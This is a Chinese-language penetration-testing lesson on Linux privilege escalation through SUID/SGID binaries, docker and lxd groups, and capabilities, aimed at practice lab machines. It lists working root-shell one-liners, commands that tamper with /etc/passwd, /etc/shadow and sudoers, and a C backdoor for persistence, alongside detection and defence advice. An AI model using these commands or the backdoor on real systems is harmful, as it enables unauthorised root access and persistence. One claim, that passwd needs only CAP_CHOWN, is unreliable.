---
title: Day053：Linux 提权 - SUID/SGID 与 Capabilities 利用
tags:
  - 网络安全
  - Linux提权
  - SUID
  - Capabilities
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d053
date: 2026-03-16
updated: 2026-01-28
---

# Day053：Linux 提权 - SUID/SGID 与 Capabilities 利用

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 9：系统提权入门 |
| **今日主题** | SUID/SGID 与 Capabilities 提权 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：昨天你在靶机上发现了好几个 SUID 程序，其中有个 `find` 命令设置了 SUID 位。你知道这可能可以提权，但不知道具体怎么做。
>
> **问题**：如何利用这些 SUID 程序获得 root shell？
>
> **今天的任务**：深入学习 SUID/SGID 提权技术，并了解更现代的 Capabilities 提权方式。

---

## 今日目标

- [ ] 掌握常见 SUID 程序的提权方法
- [ ] 理解 Linux Capabilities 机制
- [ ] 学会 Capabilities 提权技术
- [ ] 完成多种提权实战

**闯关条件**：成功通过 SUID 或 Capabilities 获得 root shell。

---

## 实战任务（先动手！）

### 任务 1：SUID 提权实战（50 分钟）

**快速回顾 SUID**：
```bash
# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# SUID 含义
# 程序运行时，以文件所有者（通常是 root）的权限执行
# 而不是以执行者的权限执行
```

**常见可利用 SUID 程序**：

**1. find**：
```bash
# 检查 SUID
ls -la /usr/bin/find
-rwsr-xr-x 1 root root ... /usr/bin/find

# 利用方法
find . -exec /bin/sh -p \; -quit

# 解释
# -exec：执行命令
# /bin/sh -p：-p 保留 effective UID（root）
# \;：exec 结束符
# -quit：执行后退出

# 获得 root shell！
```

**2. vim/vi**：
```bash
# 方法 1：直接调用 shell
vim -c ':!/bin/sh'

# 方法 2：Python 版本
vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'

# 方法 3：交互模式
vim
:set shell=/bin/sh
:shell
```

**3. nmap（老版本）**：
```bash
# 交互模式（nmap 2.02-5.21）
nmap --interactive
!sh

# 新版本
nmap --script=<(echo 'os.execute("/bin/sh")')
```

**4. less/more**：
```bash
# 打开任意文件
less /etc/passwd

# 在 less 中执行
!/bin/sh

# more 同理
more /etc/passwd
!/bin/sh
```

**5. awk**：
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**6. python/python3**：
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**7. perl**：
```bash
perl -e 'exec "/bin/sh";'
```

**8. bash**：
```bash
# 如果 bash 有 SUID（罕见但致命）
bash -p
```

**9. cp**：
```bash
# 覆盖 /etc/passwd
# 首先生成密码哈希
openssl passwd -1 -salt xyz password123

# 创建恶意 passwd 条目
echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' > /tmp/passwd

# 用 SUID cp 覆盖
cp /tmp/passwd /etc/passwd

# 登录
su hacker
```

**10. mv**：
```bash
# 类似 cp，可以覆盖敏感文件
# 备份原文件，替换为恶意文件
```

**GTFOBins 查询**：
```
每个可利用程序都在 GTFOBins 有详细说明：
https://gtfobins.github.io/

步骤：
1. 搜索程序名
2. 点击 "SUID" 标签
3. 复制 payload 执行
```

**记录**：
```
成功利用的 SUID 程序：________________
使用的 payload：________________
```

---

### 任务 2：SGID 提权（25 分钟）

**SGID 原理**：
```bash
# SGID 文件
-rwxr-sr-x 1 root shadow ... /usr/bin/expiry
#       ^
#       s = SGID 位

# 程序运行时以所属组权限执行

# 查找 SGID 文件
find / -perm -2000 -type f 2>/dev/null
```

**SGID 利用场景**：
```bash
# 场景 1：SGID 程序属于 shadow 组
# 可能读取 /etc/shadow

# 场景 2：SGID 程序属于 docker 组
# Docker 组等同于 root

# 场景 3：写入特权组目录
# 利用组权限写入敏感位置
```

**示例：docker 组提权**：
```bash
# 如果当前用户在 docker 组
id
uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# 利用 docker 提权
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 或挂载 /etc
docker run -v /etc:/mnt --rm -it alpine sh
cat /mnt/shadow
```

**示例：lxd/lxc 组提权**：
```bash
# 如果在 lxd 组
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

**记录**：
```
发现的 SGID 文件：________________
可利用的组权限：________________
```

---

### 任务 3：Linux Capabilities 详解（35 分钟）

**什么是 Capabilities？**
```
传统 Linux：root 拥有所有权限，普通用户没有特权
问题：有些程序只需要部分特权，但必须以 root 运行

Capabilities 解决方案：
将 root 权限拆分成多个独立的"能力"
程序只获得需要的能力，而不是全部 root 权限

例如：
- ping 只需要 CAP_NET_RAW（发送原始网络包）
- passwd 只需要 CAP_CHOWN（修改文件属主）
```

**常见 Capabilities**：
| Capability | 功能 | 危险程度 |
|------------|------|----------|
| CAP_SETUID | 设置任意 UID | 极高 |
| CAP_SETGID | 设置任意 GID | 极高 |
| CAP_DAC_OVERRIDE | 绕过文件权限 | 极高 |
| CAP_DAC_READ_SEARCH | 绕过读取权限 | 高 |
| CAP_NET_BIND_SERVICE | 绑定特权端口 | 中 |
| CAP_NET_RAW | 原始网络包 | 中 |
| CAP_SYS_ADMIN | 系统管理（万金油） | 极高 |
| CAP_SYS_PTRACE | 跟踪进程 | 高 |

**查找有 Capabilities 的文件**：
```bash
# 方法 1：getcap
getcap -r / 2>/dev/null

# 示例输出
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/vim = cap_dac_override+ep

# 解读
# +ep = effective and permitted（生效且允许）
# +eip = effective, inheritable, permitted
```

**Capabilities 标志含义**：
```
e (effective)：能力已激活
p (permitted)：能力被允许
i (inheritable)：能力可继承给子进程
```

**记录**：
```
发现的 Capabilities 文件：________________
危险的 Capabilities：________________
```

---

### 任务 4：Capabilities 提权实战（40 分钟）

**CAP_SETUID 提权**：
```bash
# 如果 python 有 CAP_SETUID
getcap /usr/bin/python3
/usr/bin/python3 = cap_setuid+ep

# 提权
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 解释
# os.setuid(0)：设置 UID 为 0（root）
# os.system("/bin/bash")：启动 bash
# 直接获得 root shell！
```

**CAP_DAC_OVERRIDE 提权**：
```bash
# 如果 vim 有 CAP_DAC_OVERRIDE
# 可以读写任何文件

# 读取 shadow
vim /etc/shadow

# 修改 passwd 添加 root 用户
vim /etc/passwd
# 添加：hacker:x:0:0::/root:/bin/bash

# 修改 sudoers
vim /etc/sudoers
# 添加：user ALL=(ALL) NOPASSWD: ALL
```

**CAP_DAC_READ_SEARCH 提权**：
```bash
# 如果某程序有此能力
# 可以读取任何文件

# 使用 tar 读取
tar cvf shadow.tar /etc/shadow
tar xvf shadow.tar
cat etc/shadow
```

**CAP_CHOWN 提权**：
```bash
# 可以改变任何文件的属主
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
# 现在可以读写 shadow 文件
```

**CAP_FOWNER 提权**：
```bash
# 可以设置任何文件权限
python3 -c 'import os; os.chmod("/etc/shadow", 0o777)'
# shadow 变成全局可读写
```

**CAP_SYS_ADMIN 提权**：
```bash
# 这是最危险的能力，几乎等于 root
# 可以挂载文件系统、执行特权操作等

# 示例：挂载 /etc/passwd
mount --bind /tmp/passwd /etc/passwd
```

**完整 Capabilities 提权流程**：
```bash
# 1. 枚举
getcap -r / 2>/dev/null

# 2. 分析危险能力
# CAP_SETUID, CAP_DAC_OVERRIDE, CAP_SYS_ADMIN 等

# 3. 查询 GTFOBins
# https://gtfobins.github.io/#+capabilities

# 4. 执行提权
# 根据具体程序和能力选择方法
```

**记录**：
```
利用的 Capability：________________
提权命令：________________
```

---

### 任务 5：自定义 SUID 后门（20 分钟）

**创建 SUID 后门（作为攻击者）**：
```c
// backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

**编译和设置**：
```bash
# 编译
gcc backdoor.c -o backdoor

# 设置 SUID（需要 root）
chown root:root backdoor
chmod u+s backdoor

# 测试
./backdoor
whoami  # root
```

**检测 SUID 后门**：
```bash
# 查找非标准 SUID 文件
find / -perm -4000 -type f 2>/dev/null | while read f; do
    rpm -qf "$f" 2>/dev/null || dpkg -S "$f" 2>/dev/null || echo "Unknown: $f"
done
```

**记录**：
```
理解 SUID 后门原理：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 掌握 SUID 提权方法 | 30 分 |
| 理解 SGID 利用 | 15 分 |
| 理解 Capabilities 机制 | 20 分 |
| 完成 Capabilities 提权 | 25 分 |
| 理解 SUID 后门 | 10 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### SUID 工作原理

```
正常执行：
用户 A 运行程序 → 程序以用户 A 身份运行

SUID 执行：
用户 A 运行 SUID 程序 → 程序以程序所有者身份运行

内核实现：
1. execve() 系统调用检查 SUID 位
2. 如果设置，将 effective UID 改为文件所有者
3. 程序以新 UID 运行
4. 程序结束，恢复原 UID
```

### Capabilities vs SUID

```
SUID 的问题：
- 全有或全无
- ping 需要发原始包，给 SUID 就给了全部 root 权限
- 权限过大，攻击面大

Capabilities 的优势：
- 细粒度权限
- ping 只给 CAP_NET_RAW
- 最小权限原则

但 Capabilities 也有风险：
- 某些能力组合等于 root
- CAP_SYS_ADMIN 本身就接近 root
- 配置不当同样危险
```

### 提权检测与防御

```
检测：
1. 监控异常 SUID/SGID 文件
2. 审计 Capabilities 设置
3. 监控 setuid/setgid 系统调用
4. 定期扫描对比基线

防御：
1. 最小权限原则
2. 移除不必要的 SUID
3. 使用 Capabilities 替代 SUID
4. 启用 SELinux/AppArmor
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| -p 参数被忽略 | shell 没有保留权限 | 检查 bash 版本，尝试其他方法 |
| Capabilities 不生效 | 无法执行特权操作 | 检查是否有 +e 标志 |
| docker 组不存在 | 无法利用 | 寻找其他提权向量 |
| GTFOBins 方法失败 | 程序版本不同 | 尝试变形或其他方法 |

---

## 知识卡片速查

### SUID 提权速查

```bash
# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.execl("/bin/sh","sh","-p")'

# awk
awk 'BEGIN {system("/bin/sh")}'

# less
less /etc/passwd
!/bin/sh
```

### Capabilities 速查

```bash
# 枚举
getcap -r / 2>/dev/null

# CAP_SETUID 利用
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_DAC_OVERRIDE 利用
vim /etc/shadow
# 直接读写任意文件
```

### 危险信号

```
极高风险 Capabilities：
- cap_setuid+ep
- cap_setgid+ep
- cap_dac_override+ep
- cap_sys_admin+ep

高风险 SUID：
- /usr/bin/find
- /usr/bin/vim
- /usr/bin/python*
- /usr/bin/perl
- /usr/bin/bash
```

---

## 常见问题

**Q1：为什么 -p 参数很重要？**

A1：
- bash 默认会丢弃 effective UID
- -p（privileged）保留 effective UID
- 没有 -p，即使 SUID，也会降回普通用户

**Q2：Capabilities 和 SUID 哪个更安全？**

A2：
- Capabilities 更细粒度，通常更安全
- 但不当配置同样危险
- 最安全的是两者都不用，使用 sudo

**Q3：如何在靶机上练习？**

A3：
- VulnHub 靶机
- HackTheBox
- TryHackMe
- 自建实验环境（虚拟机）

---

## 明日预告

**Day 054：Linux 提权 - Sudo 与 Cron 利用**

明天你将：
- 学习 sudo 配置错误利用
- 掌握 Cron 任务提权
- 理解环境变量劫持

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功利用的 SUID | |
| 成功利用的 Capabilities | |
| 今日收获 | |

---

> **导师点评**：
>
> SUID 提权是最经典的 Linux 提权方式。虽然现代系统越来越少见 SUID 配置问题，但在实际渗透中仍然经常遇到。
>
> GTFOBins 是你的好朋友——别背命令，记住这个网站就行。
>
> Capabilities 是 SUID 的"现代替代品"，但同样可以被滥用。很多管理员不理解 Capabilities 的危险性，给程序赋予 CAP_SETUID 就等于给了 root。
>
> **安全不是"新技术一定更好"，而是"正确配置才安全"**。

```bash
echo "Day 053 Complete! SUID/Capabilities 提权解锁！"
```
